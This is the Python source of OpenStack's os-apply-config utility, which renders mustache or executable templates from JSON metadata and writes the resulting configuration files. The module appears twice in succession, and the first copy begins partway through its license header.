#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import argparse
import json
import logging
import os
import subprocess
import sys
import tempfile

from pystache import context

from os_apply_config import collect_config
from os_apply_config import config_exception as exc
from os_apply_config import renderers
from os_apply_config import value_types
from os_apply_config import version

DEFAULT_TEMPLATES_DIR = '/usr/libexec/os-apply-config/templates'


def templates_dir():
    """Determine the default templates directory path

    If the OS_CONFIG_APPLIER_TEMPLATES environment variable has been set,
    use its value.
    Otherwise, select a default path based on which directories exist on the
    system, preferring the newer paths but still allowing the old ones for
    backwards compatibility.
    """
    templates_dir = os.environ.get('OS_CONFIG_APPLIER_TEMPLATES', None)
    if templates_dir is None:
        templates_dir = '/opt/stack/os-apply-config/templates'
        if not os.path.isdir(templates_dir):
            # Backwards compat with the old name.
            templates_dir = '/opt/stack/os-config-applier/templates'
        if (os.path.isdir(templates_dir) and
                not os.path.isdir(DEFAULT_TEMPLATES_DIR)):
            logging.warning('Template directory %s is deprecated.  The '
                            'recommended location for template files is %s',
                            templates_dir, DEFAULT_TEMPLATES_DIR)
        else:
            templates_dir = DEFAULT_TEMPLATES_DIR
    return templates_dir


TEMPLATES_DIR = templates_dir()
OS_CONFIG_FILES_PATH = os.environ.get(
    'OS_CONFIG_FILES_PATH', '/var/lib/os-collect-config/os_config_files.json')
OS_CONFIG_FILES_PATH_OLD = '/var/run/os-collect-config/os_config_files.json'


def install_config(
        config_path, template_root, output_path, validate, subhash=None,
        fallback_metadata=None):
    config = strip_hash(
        collect_config.collect_config(config_path, fallback_metadata), subhash)
    tree = build_tree(template_paths(template_root), config)
    if not validate:
        for path, contents in tree.items():
            write_file(os.path.join(
                output_path, strip_prefix('/', path)), contents)


def print_key(
        config_path, key, type_name, default=None, fallback_metadata=None):
    config = collect_config.collect_config(config_path, fallback_metadata)
    keys = key.split('.')
    for key in keys:
        try:
            config = config[key]
        except KeyError:                    
            if default is not None:
                print(str(default))
                return
            else:
                raise exc.ConfigException(
                    'key %s does not exist in %s' % (key, config_path))
    value_types.ensure_type(str(config), type_name)
    print(str(config))


def write_file(path, contents):
    logger.info("writing %s", path)
    if os.path.exists(path):
        stat = os.stat(path)
        mode, uid, gid = stat.st_mode, stat.st_uid, stat.st_gid
    else:
        mode, uid, gid = 0o644, -1, -1
    d = os.path.dirname(path)
    os.path.exists(d) or os.makedirs(d)
    with tempfile.NamedTemporaryFile(dir=d, delete=False) as newfile:
        newfile.write(contents)
        os.chmod(newfile.name, mode)
        os.chown(newfile.name, uid, gid)
        os.rename(newfile.name, path)

# return a map of filenames->filecontents


def build_tree(templates, config):
    res = {}
    for in_file, out_file in templates:
        res[out_file] = render_template(in_file, config)
    return res


def render_template(template, config):
    if is_executable(template):
        return render_executable(template, config)
    else:
        try:
            return render_moustache(open(template).read(), config)
        except context.KeyNotFoundError as e:
            raise exc.ConfigException(
                "key '%s' from template '%s' does not exist in metadata file."
                % (e.key, template))
        except Exception as e:
            logger.error("%s", e)
            raise exc.ConfigException(
                "could not render moustache template %s" % template)


def is_executable(path):
    return os.path.isfile(path) and os.access(path, os.X_OK)


def render_moustache(text, config):
    r = renderers.JsonRenderer(missing_tags='ignore')
    return r.render(text, config)


def render_executable(path, config):
    p = subprocess.Popen([path],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    stdout, stderr = p.communicate(json.dumps(config))
    p.wait()
    if p.returncode != 0:
        raise exc.ConfigException(
            "config script failed: %s\n\nwith output:\n\n%s" %
            (path, stdout + stderr))
    return stdout


def template_paths(root):
    res = []
    for cur_root, _subdirs, files in os.walk(root):
        for f in files:
            inout = (os.path.join(cur_root, f), os.path.join(
                strip_prefix(root, cur_root), f))
            res.append(inout)
    return res


def strip_prefix(prefix, s):
    return s[len(prefix):] if s.startswith(prefix) else s


def strip_hash(h, keys):
    if not keys:
        return h
    for k in keys.split('.'):
        if k in h and isinstance(h[k], dict):
            h = h[k]
        else:
            raise exc.ConfigException(
                "key '%s' does not correspond to a hash in the metadata file"
                % keys)
    return h


def parse_opts(argv):
    parser = argparse.ArgumentParser(
        description='Reads and merges JSON configuration files specified'
        ' by colon separated environment variable OS_CONFIG_FILES, unless'
        ' overridden by command line option --metadata. If no files are'
        ' specified this way, falls back to legacy behavior of searching'
        ' the fallback metadata path for a single config file.')
    parser.add_argument('-t', '--templates', metavar='TEMPLATE_ROOT',
                        help="""path to template root directory (default:
                        %(default)s)""",
                        default=TEMPLATES_DIR)
    parser.add_argument('-o', '--output', metavar='OUT_DIR',
                        help='root directory for output (default:%(default)s)',
                        default='/')
    parser.add_argument('-m', '--metadata', metavar='METADATA_FILE', nargs='*',
                        help='Overrides environment variable OS_CONFIG_FILES.'
                        ' Specify multiple times, rather than separate files'
                        ' with ":".',
                        default=[])
    parser.add_argument('--fallback-metadata', metavar='FALLBACK_METADATA',
                        nargs='*', help='Files to search when OS_CONFIG_FILES'
                        ' is empty. (default: %(default)s)',
                        default=['/var/cache/heat-cfntools/last_metadata',
                                 '/var/lib/heat-cfntools/cfn-init-data',
                                 '/var/lib/cloud/data/cfn-init-data'])
    parser.add_argument(
        '-v', '--validate', help='validate only. do not write files',
        default=False, action='store_true')
    parser.add_argument(
        '--print-templates', default=False, action='store_true',
        help='Print templates root and exit.')
    parser.add_argument('-s', '--subhash',
                        help='use the sub-hash named by this key,'
                             ' instead of the full metadata hash')
    parser.add_argument('--key', metavar='KEY', default=None,
                        help='print the specified key and exit.'
                             ' (may be used with --type and --key-default)')
    parser.add_argument('--type', default='default',
                        help='exit with error if the specified --key does not'
                             ' match type. Valid types are'
                             ' <int|default|netaddress|netdevice|dsn|'
                             'swiftdevices|raw>')
    parser.add_argument('--key-default',
                        help='This option only affects running with --key.'
                             ' Print this if key is not found. This value is'
                             ' not subject to type restrictions. If --key is'
                             ' specified and no default is specified, program'
                             ' exits with an error on missing key.')
    parser.add_argument('--version', action='version',
                        version=version.version_info.version_string())
    parser.add_argument('--os-config-files',
                        default=OS_CONFIG_FILES_PATH,
                        help='Set path to os_config_files.json')
    opts = parser.parse_args(argv[1:])

    return opts


def load_list_from_json(json_file):
    json_obj = []
    if os.path.exists(json_file):
        with open(json_file) as ocf:
            json_obj = json.loads(ocf.read())
    if not isinstance(json_obj, list):
        raise ValueError("No list defined in json file: %s" % json_file)
    return json_obj


def main(argv=sys.argv):
    opts = parse_opts(argv)
    if opts.print_templates:
        print(opts.templates)
        return 0

    if not opts.metadata:
        if 'OS_CONFIG_FILES' in os.environ:
            opts.metadata = os.environ['OS_CONFIG_FILES'].split(':')
        else:
            opts.metadata = load_list_from_json(opts.os_config_files)
            if ((not opts.metadata and opts.os_config_files ==
                 OS_CONFIG_FILES_PATH)):
                logger.warning('DEPRECATED: falling back to %s' %
                               OS_CONFIG_FILES_PATH_OLD)
                opts.metadata = load_list_from_json(OS_CONFIG_FILES_PATH_OLD)

    try:
        if opts.templates is None:
            raise exc.ConfigException('missing option --templates')

        if opts.key:
            print_key(opts.metadata,
                      opts.key,
                      opts.type,
                      opts.key_default,
                      opts.fallback_metadata)
        else:
            install_config(opts.metadata, opts.templates, opts.output,
                           opts.validate, opts.subhash, opts.fallback_metadata)
            logger.info("success")
    except exc.ConfigException as e:
        logger.error(e)
        return 1
    return 0


# logging
LOG_FORMAT = '[%(asctime)s] [%(levelname)s] %(message)s'
DATE_FORMAT = '%Y/%m/%d %I:%M:%S %p'


def add_handler(logger, handler):
    handler.setFormatter(logging.Formatter(LOG_FORMAT, datefmt=DATE_FORMAT))
    logger.addHandler(handler)
logger = logging.getLogger('os-apply-config')
logger.setLevel(logging.INFO)
add_handler(logger, logging.StreamHandler())
if os.geteuid() == 0:
    add_handler(logger, logging.FileHandler('/var/log/os-apply-config.log'))

if __name__ == '__main__':
    sys.exit(main(sys.argv))

# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import argparse
import json
import logging
import os
import subprocess
import sys
import tempfile

from pystache import context

from os_apply_config import collect_config
from os_apply_config import config_exception as exc
from os_apply_config import renderers
from os_apply_config import value_types
from os_apply_config import version

DEFAULT_TEMPLATES_DIR = '/usr/libexec/os-apply-config/templates'


def templates_dir():
    """Determine the default templates directory path

    If the OS_CONFIG_APPLIER_TEMPLATES environment variable has been set,
    use its value.
    Otherwise, select a default path based on which directories exist on the
    system, preferring the newer paths but still allowing the old ones for
    backwards compatibility.
    """
    templates_dir = os.environ.get('OS_CONFIG_APPLIER_TEMPLATES', None)
    if templates_dir is None:
        templates_dir = '/opt/stack/os-apply-config/templates'
        if not os.path.isdir(templates_dir):
            # Backwards compat with the old name.
            templates_dir = '/opt/stack/os-config-applier/templates'
        if (os.path.isdir(templates_dir) and
                not os.path.isdir(DEFAULT_TEMPLATES_DIR)):
            logging.warning('Template directory %s is deprecated.  The '
                            'recommended location for template files is %s',
                            templates_dir, DEFAULT_TEMPLATES_DIR)
        else:
            templates_dir = DEFAULT_TEMPLATES_DIR
    return templates_dir


TEMPLATES_DIR = templates_dir()
OS_CONFIG_FILES_PATH = os.environ.get(
    'OS_CONFIG_FILES_PATH', '/var/lib/os-collect-config/os_config_files.json')
OS_CONFIG_FILES_PATH_OLD = '/var/run/os-collect-config/os_config_files.json'


def install_config(
        config_path, template_root, output_path, validate, subhash=None,
        fallback_metadata=None):
    config = strip_hash(
        collect_config.collect_config(config_path, fallback_metadata), subhash)
    tree = build_tree(template_paths(template_root), config)
    if not validate:
        for path, contents in tree.items():
            write_file(os.path.join(
                output_path, strip_prefix('/', path)), contents)


def print_key(
        config_path, key, type_name, default=None, fallback_metadata=None):
    config = collect_config.collect_config(config_path, fallback_metadata)
    keys = key.split('.')
    for key in keys:
        try:
            config = config[key]
        except KeyError:                    
            if default is not None:
                print(str(default))
                return
            else:
                raise exc.ConfigException(
                    'key %s does not exist in %s' % (key, config_path))
    value_types.ensure_type(str(config), type_name)
    print(str(config))


def write_file(path, contents):
    logger.info("writing %s", path)
    if os.path.exists(path):
        stat = os.stat(path)
        mode, uid, gid = stat.st_mode, stat.st_uid, stat.st_gid
    else:
        mode, uid, gid = 0o644, -1, -1
    d = os.path.dirname(path)
    os.path.exists(d) or os.makedirs(d)
    with tempfile.NamedTemporaryFile(dir=d, delete=False) as newfile:
        newfile.write(contents)
        os.chmod(newfile.name, mode)
        os.chown(newfile.name, uid, gid)
        os.rename(newfile.name, path)

# return a map of filenames->filecontents


def build_tree(templates, config):
    res = {}
    for in_file, out_file in templates:
        res[out_file] = render_template(in_file, config)
    return res


def render_template(template, config):
    if is_executable(template):
        return render_executable(template, config)
    else:
        try:
            return render_moustache(open(template).read(), config)
        except context.KeyNotFoundError as e:
            raise exc.ConfigException(
                "key '%s' from template '%s' does not exist in metadata file."
                % (e.key, template))
        except Exception as e:
            logger.error("%s", e)
            raise exc.ConfigException(
                "could not render moustache template %s" % template)


def is_executable(path):
    return os.path.isfile(path) and os.access(path, os.X_OK)


def render_moustache(text, config):
    r = renderers.JsonRenderer(missing_tags='ignore')
    return r.render(text, config)


def render_executable(path, config):
    p = subprocess.Popen([path],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    stdout, stderr = p.communicate(json.dumps(config))
    p.wait()
    if p.returncode != 0:
        raise exc.ConfigException(
            "config script failed: %s\n\nwith output:\n\n%s" %
            (path, stdout + stderr))
    return stdout


def template_paths(root):
    res = []
    for cur_root, _subdirs, files in os.walk(root):
        for f in files:
            inout = (os.path.join(cur_root, f), os.path.join(
                strip_prefix(root, cur_root), f))
            res.append(inout)
    return res


def strip_prefix(prefix, s):
    return s[len(prefix):] if s.startswith(prefix) else s


def strip_hash(h, keys):
    if not keys:
        return h
    for k in keys.split('.'):
        if k in h and isinstance(h[k], dict):
            h = h[k]
        else:
            raise exc.ConfigException(
                "key '%s' does not correspond to a hash in the metadata file"
                % keys)
    return h


def parse_opts(argv):
    parser = argparse.ArgumentParser(
        description='Reads and merges JSON configuration files specified'
        ' by colon separated environment variable OS_CONFIG_FILES, unless'
        ' overridden by command line option --metadata. If no files are'
        ' specified this way, falls back to legacy behavior of searching'
        ' the fallback metadata path for a single config file.')
    parser.add_argument('-t', '--templates', metavar='TEMPLATE_ROOT',
                        help="""path to template root directory (default:
                        %(default)s)""",
                        default=TEMPLATES_DIR)
    parser.add_argument('-o', '--output', metavar='OUT_DIR',
                        help='root directory for output (default:%(default)s)',
                        default='/')
    parser.add_argument('-m', '--metadata', metavar='METADATA_FILE', nargs='*',
                        help='Overrides environment variable OS_CONFIG_FILES.'
                        ' Specify multiple times, rather than separate files'
                        ' with ":".',
                        default=[])
    parser.add_argument('--fallback-metadata', metavar='FALLBACK_METADATA',
                        nargs='*', help='Files to search when OS_CONFIG_FILES'
                        ' is empty. (default: %(default)s)',
                        default=['/var/cache/heat-cfntools/last_metadata',
                                 '/var/lib/heat-cfntools/cfn-init-data',
                                 '/var/lib/cloud/data/cfn-init-data'])
    parser.add_argument(
        '-v', '--validate', help='validate only. do not write files',
        default=False, action='store_true')
    parser.add_argument(
        '--print-templates', default=False, action='store_true',
        help='Print templates root and exit.')
    parser.add_argument('-s', '--subhash',
                        help='use the sub-hash named by this key,'
                             ' instead of the full metadata hash')
    parser.add_argument('--key', metavar='KEY', default=None,
                        help='print the specified key and exit.'
                             ' (may be used with --type and --key-default)')
    parser.add_argument('--type', default='default',
                        help='exit with error if the specified --key does not'
                             ' match type. Valid types are'
                             ' <int|default|netaddress|netdevice|dsn|'
                             'swiftdevices|raw>')
    parser.add_argument('--key-default',
                        help='This option only affects running with --key.'
                             ' Print this if key is not found. This value is'
                             ' not subject to type restrictions. If --key is'
                             ' specified and no default is specified, program'
                             ' exits with an error on missing key.')
    parser.add_argument('--version', action='version',
                        version=version.version_info.version_string())
    parser.add_argument('--os-config-files',
                        default=OS_CONFIG_FILES_PATH,
                        help='Set path to os_config_files.json')
    opts = parser.parse_args(argv[1:])

    return opts


def load_list_from_json(json_file):
    json_obj = []
    if os.path.exists(json_file):
        with open(json_file) as ocf:
            json_obj = json.loads(ocf.read())
    if not isinstance(json_obj, list):
        raise ValueError("No list defined in json file: %s" % json_file)
    return json_obj


def main(argv=sys.argv):
    opts = parse_opts(argv)
    if opts.print_templates:
        print(opts.templates)
        return 0

    if not opts.metadata:
        if 'OS_CONFIG_FILES' in os.environ:
            opts.metadata = os.environ['OS_CONFIG_FILES'].split(':')
        else:
            opts.metadata = load_list_from_json(opts.os_config_files)
            if ((not opts.metadata and opts.os_config_files ==
                 OS_CONFIG_FILES_PATH)):
                logger.warning('DEPRECATED: falling back to %s' %
                               OS_CONFIG_FILES_PATH_OLD)
                opts.metadata = load_list_from_json(OS_CONFIG_FILES_PATH_OLD)

    try:
        if opts.templates is None:
            raise exc.ConfigException('missing option --templates')

        if opts.key:
            print_key(opts.metadata,
                      opts.key,
                      opts.type,
                      opts.key_default,
                      opts.fallback_metadata)
        else:
            install_config(opts.metadata, opts.templates, opts.output,
                           opts.validate, opts.subhash, opts.fallback_metadata)
            logger.info("success")
    except exc.ConfigException as e:
        logger.error(e)
        return 1
    return 0


# logging
LOG_FORMAT = '[%(asctime)s] [%(levelname)s] %(message)s'
DATE_FORMAT = '%Y/%m/%d %I:%M:%S %p'


def add_handler(logger, handler):
    handler.setFormatter(logging.Formatter(LOG_FORMAT, datefmt=DATE_FORMAT))
    logger.addHandler(handler)
logger = logging.getLogger('os-apply-config')
logger.setLevel(logging.INFO)
add_handler(logger, logging.StreamHandler())
if os.geteuid() == 0:
    add_handler(logger, logging.FileHandler('/var/log/os-apply-config.log'))

if __name__ == '__main__':
    sys.exit(main(sys.argv))

